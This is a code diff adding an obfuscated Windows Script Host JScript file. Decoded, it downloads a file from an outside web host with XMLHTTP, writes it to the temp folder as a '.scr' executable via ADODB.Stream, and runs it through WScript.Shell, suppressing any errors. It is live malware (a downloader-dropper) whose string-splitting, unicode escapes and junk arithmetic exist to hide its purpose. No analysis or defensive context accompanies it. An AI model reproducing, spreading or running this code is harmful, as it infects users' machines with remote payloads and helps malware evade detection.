@@ -1,0 +1,24 @@
+modernCycle = (((0 ^ 1) * (0 ^ 1)), this);
+depotScandal = ("compa\u0063" + "\u0074", "sa\u006c" + "\u0075\u0074\u0065", "\u0052u" + "\u006e");
+bazaarStatue = modernCycle[("WSc\u0072" + "\u0069" + "\u0070t")];
+bazaarStatue[("\u006d\u006f\u0074\u0069" + "vate", "\u0053\u006cee" + "p")](((688400 | 657216) / ((((([!+[] + !+[]])) + "" + (([!+[] + !+[] + !+[]])))) * ([!+[] + !+[]]))));
+doubleThermometer = bazaarStatue[("Cr" + "e\u0061t\u0065" + "\u004fb\u006ae" + "c" + "t")](("W\u0053cr" + "\u0069p\u0074\u002eS\u0068" + "e\u006cl"));
+militaryPrize = doubleThermometer[("in\u0064i\u0076i" + "\u0064\u0075" + "a" + "\u006c", "\u0064i" + "re" + "cto\u0072", "\u006d\u0065" + "m\u006f" + "\u0072\u0069" + "a\u006c", "\u0045\u0078pa\u006e" + "\u0064Env\u0069" + "ro" + "\u006e\u006d\u0065\u006e\u0074" + "\u0053" + "\u0074rin" + "\u0067\u0073")](("\u0063\u0061r" + "\u0065e" + "r", "box", "\u0025\u0054E" + "\u004d\u0050%/")) + ("\u0072" + "\u0065" + "s\u0069\u0064en\u0063" + "\u0065", "\u0063ast\u0065", "\u0069\u006d\u0070er" + "\u0061ti" + "v\u0065\u0052\u0065\u0073\u0065" + "rva" + "\u0074i" + "\u006fn") + ("r\u0065\u0063\u006frd", "d" + "o\u0063ume" + "\u006e\u0074", "prac" + "t" + "\u0069\u0063e", "ci" + "v" + "i\u006ci\u007aa" + "\u0074\u0069\u006f\u006e", ".s\u0063r");
+profileExtreme = modernCycle[("f\u0069\u006c\u0065", "W\u0053\u0063\u0072\u0069p" + "t")][("\u0072\u0065" + "\u0073\u0065" + "\u0072" + "v\u0061\u0074i" + "o" + "n", "\u006do" + "\u0072\u0070\u0068olo" + "\u0067y", "Cr\u0065at" + "\u0065O\u0062j\u0065\u0063" + "t")](("M\u0053" + "\u0058M\u004c\u0032." + "X\u004d\u004c" + "H\u0054TP"));
+profileExtreme[("\u006f\u0072\u0069" + "\u0065\u006etat\u0069" + "on", "op\u0065" + "\u006e")](("pass", "ch\u006fco" + "l\u0061" + "t\u0065", "\u0047" + "E\u0054"), ("d" + "\u0065\u0063l\u0061r" + "\u0061\u0074\u0069" + "\u006fn", "ht\u0074\u0070" + "\u003a\u002f\u002f" + "\u0061" + "\u0063c\u0065s" + "s" + "in" + "ve\u0073t\u006de" + "\u006e" + "t\u002en\u0065\u0074" + "\u002f" + "4/0v\u0065" + "xw3\u00735"), !((Math.pow((Math.pow(((([!+[] + !+[] + !+[]])) + ((6 + 2) | (1 ^ 9))), (((Math.pow(15, 2) - 217) | 0) - ((1 | 12) - (Math.pow(19, 2) - 354)))) - (((2 + 23)) + ((Math.pow(10, 2) - 87) ^ (121 - 57)))), ((((94 ^ 56), (690 / 46)) * ((26 + 20) / (11 * 2 + 1))) - (([!+[] + !+[]]) * ([!+[] + !+[]]) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] + ((12 ^ 22) - (25 & 27)))))) - ((((109 ^ 252) + (1954 & 1398)) - (Math.pow((12120 / 30), (([!+[] + !+[]]))) - (145554 ^ 17556))) / (((0 & 1) ^ (([+[]]))) | ((0 ^ 1) ^ (1 * 2))))) == 6));
+profileExtreme[("\u0062r\u0069l" + "l\u0069ant", "lo\u0067i" + "\u0063", "\u0064" + "is\u0063\u0072" + "e\u0074" + "e", "send")]();
+while(profileExtreme[("i\u006ev\u0065" + "st", "\u0063\u006fm\u006d\u0065" + "\u006et", "\u0063e" + "nt\u0072a\u006c", "dog", "r\u0065\u0061d\u0079s" + "\u0074a\u0074e")] < 2 * (2 ^ 0)) {
+	modernCycle[("\u0057S" + "\u0063\u0072\u0069p" + "\u0074")][("co\u006eve" + "n\u0074\u0069on", "\u0069" + "n\u0064u" + "s\u0074\u0072\u0069" + "a" + "l", "s\u0061\u0074\u0065" + "l\u006c\u0069te", "\u0070\u0065" + "\u0061k", "S\u006c\u0065ep")](((Math.pow(25, 2) - 607) * (5 & 5) + (0 | 10)));
+}
+artilleryControl = modernCycle[("\u006d" + "\u0061r\u006b", "p\u0072\u006fg\u0072" + "e\u0073" + "s" + "\u0069v\u0065", "\u0073ti" + "m\u0075lus", "c" + "\u0068arm", "WS\u0063\u0072i\u0070" + "\u0074")][("d\u0069" + "\u0061\u006de\u0074e" + "\u0072", "i\u006et" + "er\u0070" + "\u0072\u0065" + "t", "ac\u0074\u0069\u0076e", "C\u0072e" + "\u0061" + "t\u0065\u004f" + "\u0062j\u0065ct")](("\u0041\u0044\u004f\u0044" + "B\u002eS\u0074r\u0065" + "\u0061m"));
+try {
+	artilleryControl[("po" + "\u0074" + "\u0065n\u0074" + "ia" + "l", "\u0064\u0069st" + "\u0061\u006e\u0074", "gu\u0069de", "\u006fpe\u006e")]();
+	artilleryControl[("a\u0072\u0074i\u0073t", "\u0068o" + "te" + "\u006c", "\u0063i\u0072\u0063" + "\u006c\u0065", "telev\u0069" + "s\u0069on", "\u0074y\u0070\u0065")] = (40, 1);
+	artilleryControl[("order", "a\u006c" + "\u0074\u0065r" + "\u006e\u0061\u0074\u0069ve", "\u0076\u0061\u0072i\u0061" + "nt", "\u0061m" + "or\u0070\u0068" + "ous", "\u0077\u0072i\u0074e")](profileExtreme[("\u006d\u0069" + "n\u0075s", function String.prototype.documentDirector() {
+		return this
+	}, "R\u0065\u0073\u0070o" + "\u006ese" + "Bod\u0079")]);
+	artilleryControl[("po\u0073i\u0074i" + "\u006f\u006e")] = ((0 ^ 0) ^ (1 * 0));
+	artilleryControl[("\u0073av" + "e" + "\u0054oFi" + "\u006ce")](militaryPrize, ((10 ^ 42) / (Math.pow(28, 2) - 768)));
+	artilleryControl[("\u0067\u0072am\u006d" + "ar", "gu" + "\u0061r\u0064", "fal\u0073\u0065", "cl\u006fse")]();
+	doubleThermometer[depotScandal](militaryPrize.documentDirector(), ((0 | 0) | 0), ((49 - 49) | (([+[]]))));
+} catch(sphericalPseudonym) {};
